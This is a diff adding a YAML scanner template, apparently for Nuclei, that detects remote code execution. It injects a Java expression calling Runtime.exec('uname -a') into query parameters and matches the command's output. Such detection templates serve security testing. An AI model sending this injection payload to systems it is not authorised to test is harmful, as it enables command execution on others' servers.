@@ -1,0 +1,42 @@
+id: fuzz-rce
+
+info:
+  name: Remote Code Execution Detection
+  author: netbaan
+  severity: critical
+  description: |
+    This template is designed to detect Remote Code Execution (RCE) vulnerabilities using a specified payload.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      rce:
+        - "org.apache.commons.io.IOUtils.toString(java.lang.Runtime.getRuntime().exec(\"uname -a\").getInputStream())"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{rce}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Linux"            # Expecting the output of "uname -a" to be matched
+          - "Unix"             # Other possible outputs
+          - "Darwin"           # If testing against macOS systems
+          - "Windows"          # For potential Windows outputs
+
+      - type: word
+        part: header
+        words:
+          - "text/plain"      # Assuming a plain text response could indicate command output
